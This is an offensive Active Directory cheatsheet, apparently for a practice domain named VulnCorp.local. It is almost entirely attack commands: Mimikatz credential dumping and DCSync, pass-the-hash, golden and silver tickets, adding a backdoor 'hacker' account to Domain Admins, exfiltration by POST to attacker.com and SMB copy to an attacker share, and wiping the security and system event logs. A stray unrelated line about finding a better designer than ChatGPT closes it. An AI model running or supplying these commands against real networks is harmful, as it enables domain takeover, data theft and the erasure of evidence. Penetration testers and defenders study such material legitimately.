# Active Directory Cheatsheet



  1. [Initial Enumeration](#initial-enumeration)
  2. [Domain Enumeration](#domain-enumeration)
  3. [Lateral Movement](#lateral-movement)
  4. [Credential Dumping](#credential-dumping)
  5. [Persistence Techniques](#persistence-techniques)
  6. [Privilege Escalation](#privilege-escalation)
  7. [Data Exfiltration](#data-exfiltration)
  8. [Cleanup](#cleanup)


---

## Initial Enumeration

### Basic System Info
```powershell
systeminfo
hostname
whoami /all
```

### Network Information
```powershell
ipconfig /all
route print
arp -a
nslookup VulnCorp.local
```

### User Context
```powershell
net user %username% /domain
klist
```

### Domain Information
```powershell
net view /domain
net view /domain:VulnCorp
nltest /domain_trusts
Get-ADDomain
```

---

## Domain Enumeration

### Users and Groups
```powershell
# All domain users
net user /domain
Get-ADUser -Filter * | Select-Object SamAccountName,Enabled

# Privileged groups
net group "Domain Admins" /domain
net group "Enterprise Admins" /domain
Get-ADGroupMember -Identity "Domain Admins" -Recursive

# User details
Get-ADUser -Identity username -Properties *
```

### Computers and Servers
```powershell
net group "Domain Computers" /domain
Get-ADComputer -Filter * | Select-Object Name,OperatingSystem
Get-ADDomainController -Discover -Service PrimaryDC
```

### Password Policy
```powershell
net accounts /domain
Get-ADDefaultDomainPasswordPolicy
```

### GPO Enumeration
```powershell
Get-GPO -All
Get-GPOReport -All -ReportType Html -Path C:\temp\GPOReport.html
```

---

## Lateral Movement

### PSExec
```powershell
psexec \\target-pc -u VulnCorp\admin -p Password123 cmd.exe
```

### WMI
```powershell
wmic /node:target-pc /user:VulnCorp\admin /password:Password123 process call create "cmd.exe"
```

### Scheduled Tasks
```powershell
schtasks /create /s target-pc /u VulnCorp\admin /p Password123 /tn "TaskName" /tr "cmd.exe" /sc once /st 00:00
schtasks /run /s target-pc /u VulnCorp\admin /p Password123 /tn "TaskName"
```

### Pass-the-Hash
```powershell
mimikatz # sekurlsa::pth /user:admin /domain:VulnCorp.local /ntlm:HASHHERE /run:cmd.exe
```

---

## Credential Dumping

### Mimikatz
```powershell
privilege::debug
sekurlsa::logonpasswords
lsadump::sam
lsadump::secrets
```

### DCSync
```powershell
lsadump::dcsync /domain:VulnCorp.local /user:Administrator
```

### Registry Hives
```powershell
reg save HKLM\SAM sam.save
reg save HKLM\SYSTEM system.save
```

### LSA Secrets
```powershell
Invoke-Mimikatz -Command '"lsadump::secrets"'
```

---

## Persistence Techniques

### Golden Ticket
```powershell
kerberos::golden /user:fakeadmin /domain:VulnCorp.local /sid:S-1-5-21-... /krbtgt:HASH /ptt
```

### Silver Ticket
```powershell
kerberos::golden /user:admin /domain:VulnCorp.local /sid:S-1-5-21-... /target:dc01.VulnCorp.local /service:cifs /rc4:HASH /ptt
```

### Account Creation
```powershell
net user hacker P@ssw0rd123 /add /domain
net group "Domain Admins" hacker /add /domain
```

---

## Privilege Escalation

### Service Enumeration
```powershell
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\"
```

### AlwaysInstallElevated
```powershell
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Writable Paths
```powershell
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
```

---

## Data Exfiltration

### Compression
```powershell
Compress-Archive -Path C:\sensitive\* -DestinationPath C:\temp\data.zip
```

### Web Transfer
```powershell
Invoke-WebRequest -Uri http://attacker.com/exfil -Method POST -InFile C:\temp\data.zip
```

### SMB Transfer
```powershell
net use x: \\attacker-ip\share /user:attacker-user password
copy C:\data\* x:\
```

---

## Cleanup

### Log Clearing
```powershell
wevtutil cl system
wevtutil cl security
```

### Artifact Removal
```powershell
schtasks /delete /tn "Persistence" /f
net user hacker /delete /domain
```

# I need better designer than chatGPT, If you can help me then help me